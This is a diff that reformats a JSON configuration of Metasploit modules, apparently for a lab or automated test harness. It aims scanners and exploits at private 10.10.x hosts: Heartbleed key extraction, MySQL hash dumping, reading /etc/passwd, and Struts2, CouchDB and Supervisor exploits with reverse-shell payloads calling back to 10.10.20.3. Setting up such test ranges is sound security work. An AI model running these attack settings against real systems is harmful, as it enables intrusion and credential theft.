@@ -1,36 +1,84 @@
 {
     "auxiliary": {
         "scanner/mysql/mysql_authbypass_hashdump": [
-            { "RHOSTS": "10.10.0.3" }
+            {
+                "RHOSTS": "10.10.0.3"
+            }
         ],
         "scanner/ssl/openssl_heartbleed": [
-            { "RHOSTS": "10.10.0.4", "ACTION": "KEYS" }
+            {
+                "RHOSTS": "10.10.0.4",
+                "ACTION": "KEYS"
+            }
         ],
         "scanner/ssh/ssh_enumusers": [
-            { "RHOSTS": "10.10.0.5", "USERNAME": "root" }
+            {
+                "RHOSTS": "10.10.0.5",
+                "USERNAME": "root"
+            }
         ],
         "scanner/http/apache_mod_cgi_bash_env": [
-            { "RHOSTS": "10.10.0.6", "TARGETURI": "/victim.cgi" }
+            {
+                "RHOSTS": "10.10.0.6",
+                "TARGETURI": "/victim.cgi"
+            }
         ],
         "scanner/ssh/libssh_auth_bypass": [
-            { "RHOSTS": "10.10.0.7", "CMD": "id", "ACTION": "Execute" }
+            {
+                "RHOSTS": "10.10.0.7",
+                "CMD": "id",
+                "ACTION": "Execute"
+            }
         ],
         "scanner/http/coldfusion_locale_traversal": [
-            { "RHOSTS": "10.10.0.8", "RPORT": "8500", "FILE": "/etc/passwd" }
+            {
+                "RHOSTS": "10.10.0.8",
+                "RPORT": "8500",
+                "FILE": "/etc/passwd"
+            }
         ],
         "gather/rails_doubletap_file_read": [
-            { "RHOSTS": "10.10.0.14", "RPORT": "3000", "ROUTE": "/robots" }
+            {
+                "RHOSTS": "10.10.0.14",
+                "RPORT": "3000",
+                "ROUTE": "/robots"
+            }
         ]
     },
     "exploit": {
         "linux/http/supervisor_xmlrpc_exec": [
-            { "RHOSTS": "10.10.0.11", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "PAYLOAD.LHOST" : "10.10.20.3" }
+            {
+                "RHOSTS": "10.10.0.11",
+                "PAYLOAD": {
+                    "NAME": "linux/x64/meterpreter/reverse_tcp",
+                    "OPTIONS": {
+                        "LHOST" : "10.10.20.3"
+                    }
+                }
+            }
         ],
         "linux/http/apache_couchdb_cmd_exec": [
-            { "RHOSTS": "10.10.0.12", "PAYLOAD": "linux/x64/shell_reverse_tcp", "PAYLOAD.LHOST" : "10.10.20.3" }
+            {
+                "RHOSTS": "10.10.0.12",
+                "PAYLOAD": {
+                    "NAME": "linux/x64/shell_reverse_tcp",
+                    "OPTIONS": {
+                        "LHOST" : "10.10.20.3"
+                    }
+                }
+            }
         ],
         "multi/http/struts2_content_type_ognl": [
-            { "RHOSTS": "10.10.0.17", "TARGETURI": "/", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp", "PAYLOAD.LHOST": "10.10.20.3" }
+            {
+                "RHOSTS": "10.10.0.17",
+                "TARGETURI": "/",
+                "PAYLOAD": {
+                    "NAME": "linux/x64/meterpreter/reverse_tcp",
+                    "OPTIONS": {
+                        "LHOST": "10.10.20.3"
+                    }
+                }
+            }
         ]
     }
 }
